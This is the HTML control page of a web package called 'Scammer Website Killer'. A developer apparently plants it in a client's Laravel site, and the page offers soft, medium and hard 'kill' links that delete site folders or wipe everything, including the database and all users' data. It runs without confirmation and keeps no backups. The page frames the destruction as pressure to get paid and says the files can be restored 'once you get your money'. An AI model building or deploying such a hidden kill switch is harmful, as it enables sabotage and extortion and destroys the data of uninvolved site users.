<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Scammer - Kill a Scammer Website</title>
    <link href="https://fonts.googleapis.com/css?family=Tajawal&display=swap" rel="stylesheet">
    <style media="screen">
      body{
        padding:15px;
        font-family: Tajawal , sans-serif;
      }
      .welcome-screen{
        background: #f7f7f7;
        padding: 15px;
        border-radius: 4px;
        margin-bottom: 40px;
      }
      .main-link{
        background-color: #a73030;
        color: #fff;
        padding: 10px 25px;
        text-decoration: none;
        border-radius: 4px;
        text-align: center;
        margin-top: 25px;
      }
    </style>
  </head>
  <body>
    <div class="welcome-screen">
      <h1>Scammer Website Killer</h1>
      <p>Hello , Really Sorry that you have to do this :( but modern problems requires modern solutions , Let's get to it !<br>
        it's important to know that larger websites amy take longer time to be killed , After the process is done , check the website homepage to see your custom message !
      </p>
      <p><b>IMPORTANT NOTICE</b> This package do not take any backups , once you choose any action the files / data will be gone for good , so make sure that you have a backup at your local machin
        , and since you are here you probably lost access to the server so you must know that the files will be deleted and there is no way to get them back , the only files available are the ones you
        actually have .
      </p>
    </div>
    <h1>Choose Kill Level</h1>
    <div class="welcome-screen">
      <h2>Soft Kill</h2>
      <p>This option is recommended , once you click the button below the script will delete all the files in the /routes folder and the index.php file will be updated with the message you set when you installed the package.</p>
      <p><b>Notice:</b> Once you click the button below the script will get to work , there is no alert or confirmation message !</p>
      <br>
      <a class="main-link" href="{{route('kill.do' , 'soft_kill')}}">Perform a Soft Kill</a>
    </div>
    <div class="welcome-screen">
      <h2>Med Kill</h2>
      <p>This option will remove all the files in (app , database , public , resources , routes) , This is a upper level killing , the point of it is that all the deleted files won't affect the users data so once you get your money you can upload the files back and everyone wins</p>
      <p><b>Notice:</b> Once you click the button below the script will get to work , there is no alert or confirmation message !</p>
      <br>
      <a class="main-link" href="{{route('kill.do' , 'med_kill')}}">Perform a Med Kill</a>
    </div>
    <div class="welcome-screen">
      <h2>Hard Kill</h2>
      <p>This option will remove EVERYTHING about the website , the website will become one single file called index.php containing the message you set , notice that also the database will be rested and all the users data will be gone , please be carefull here .</p>
      <p><b>Notice:</b> Once you click the button below the script will get to work , there is no alert or confirmation message !</p>
      <br>
      <a class="main-link" href="{{route('kill.do' , 'hard_kill')}}">Perform a Hard Kill</a>
    </div>
  </body>
</html>
